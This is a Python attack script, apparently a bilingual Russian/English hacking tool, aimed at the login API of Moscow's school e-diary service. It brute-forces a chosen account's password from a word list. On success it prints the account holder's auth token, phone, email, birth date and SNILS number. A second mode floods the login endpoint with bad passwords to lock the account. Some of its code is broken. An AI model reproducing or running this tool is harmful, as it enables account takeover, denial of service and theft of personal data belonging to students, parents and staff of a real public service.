import requests
import os
import json
import random
#from colorama import init, Fore, Back, Style
#init()
banner = """

─█▀▀█ ░█▄─░█ ▀▀█▀▀ ▀█▀ ░█▀▀▀█ ░█▀▀█ ░█─░█ 
░█▄▄█ ░█░█░█ ─░█── ░█─ ─▀▀▀▄▄ ░█─── ░█▀▀█ 
░█─░█ ░█──▀█ ─░█── ▄█▄ ░█▄▄▄█ ░█▄▄█ ░█─░█

    created by @debian_lab && @mitchel_ed
"""


option = 0
version = 0
def bruteforce(mode, login):
    if mode == "know login":
        clear()
        if version == 1:
            slovar = int(input("1) Использовать Ваш собственный словарь\n2) Использовать наш словарь"))
        else:
            slovar = int(input("1) Use your own dictionary\n2) Use our dictionary"))
        if slovar == 1:
            slovar = "./slovar.txt"
        else: 
            slovar = "./our_slovar.txt"
        if version == 1:
            print(f"[+] Атака на {login} началась")
        else:
            print(f"[+] Login attack started on {login}")
        passwords = open(slovar, "r", encoding="utf-8").readlines()
        if passwords != "":
            for password in passwords:
                res = requests.post("https://dnevnik.mos.ru/lms/api/sessions", json={
                    "login": login,
                    "password_plain": password
                })
                
                
                if res.status_code != 200:
                    if version == 1:
                        print("[-] Пароль " + password + " не подходит!\n")
                    else:
                        print("[-] password " + password + " does not fit!\n")
                    
                elif res.status_code == 200:
                    if version == 1:
                        print("[+] Пароль " + password + " подошел!")
                    else:
                        print("[-] Passowrd " + password + " came up!")
                    token = res.json().authentication_token
                    date = res.json().date_of_birth
                    first_name = res.json().first_name
                    guid = res.json().guid
                    email = res.json().email
                    id = res.json().id
                    last_name = res.json().last_name
                    phone = res.json().phone_number
                    sex = res.json().sex
                    snils = res.json().snils 
                    print("[+] Полученные данные:")
                    print("Токен Авторизации: " + token)
                    print("Имя: " + first_name + "  " + last_name)
                    print("Пол: " + sex)
                    print("Дата Рождения: " + date)
                    print("Государственный ID: " + guid)
                    print("Номер телефона: " + phone)
                    print("Электронная почта: " + email)
                    print("СНИЛС " + snils)
                    break
        else:
            print("[-] Вы не заполнили slovar.txt")
    elif mode == "ddos":
        while True:
            instance = "abcdefghijklmnopqrstuvwxyz"
            password = ""
            for i in range(7):
                password + random.choice(instance)    
            
            res = requests.post("https://dnevnik.mos.ru/lms/api/sessions", json={
                "login": login,
                "password_plain": password
            })
            if version == 1:
                print("[+] Запрос отправлен")
            else:
                print("[+] Request has been sent")
                          
def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    print(banner)

def menu():
    global option
    clear()
    if version == 1:
        menu = "\n\n1) Брутфорс атака\n2) Заблокировать аккаунт\n3) Инструкция\n\nВыберите опцию:"
    elif version == 2:
        menu = "\n\n1) Bruteforce attack\n2) Block account\n3) Help\n\nChoose Option:"
    else:
        menu()

    option = int(input(menu))
    option_check()
    
def language():
    global version
    clear()
    version = int(input("\n\n1) Russian version\n2) English version\n\nChoose Option:"))
    if version != 1 and version != 2:
        language()

def option_check():
    if option == 3:
        clear()
        if version == 1:
            print("\n\nВсе пароли по которым будет брутфорс требуется добавить в файл slovar.txt\n")
            input("Нажмите 'Enter' чтобы продолжить.....")
        elif version == 2:
            print("\n\nAll passwords must be added to the slovar.txt file\n")
            input("Press 'Enter' to continue.....")

        clear()
        menu()
    elif option == 2:
        clear()
        login = input("Введите логин: ")
        try:
            bruteforce("ddos", login)
        except:
            print("Goodbye, friend!")
    elif option == 1:
        clear()
        login = input("Введите логин: ")
        try:
            bruteforce("know login", login)
        except:
            print("Goodbye, friend!")
        
clear()
language()
menu()
